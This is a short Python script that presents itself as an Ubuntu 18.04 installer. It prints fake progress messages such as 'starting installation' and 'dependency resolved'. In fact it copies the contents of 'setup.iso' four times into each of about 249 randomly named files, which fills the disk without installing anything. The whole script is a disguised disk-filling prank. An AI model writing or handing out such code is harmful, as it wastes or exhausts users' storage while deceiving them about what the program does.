import random
read_file =open("setup.iso", "r")
content = read_file.read()
read_file.close()

print("Installation will begin soon.....")

for outer_var in range(1,250):
	file_name = "installation_folder/UBUNTU_18.04.1_DESKTOP_AMD_64BIT_" + str(random.randint(1,101)*outer_var)
	print("starting installation for ", file_name)
	write_file = open(file_name,"a+")
	for inner_var in range(1,5):
		write_file.write(content)
	if random.randint(1,101) == 100:
		print("dependency resolved")
	write_file.close()